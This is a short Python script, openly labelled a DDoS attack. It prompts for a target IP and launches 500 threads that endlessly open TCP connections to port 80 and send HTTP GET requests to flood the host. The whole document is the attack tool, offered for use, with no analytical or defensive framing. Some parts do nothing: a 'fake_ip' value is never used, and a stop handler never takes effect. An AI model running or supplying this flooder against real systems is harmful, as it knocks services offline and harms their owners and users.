import socket
import threading
from colorama import Fore

target = ""
fake_ip = "182.21.20.32"
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.close()

def run():
    global target
    target = input("\n[+] Enter Target IP: ").strip()
    
    print(Fore.RED + "[!] Starting DDoS attack (Ctrl+C to stop)...")
    try:
        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped")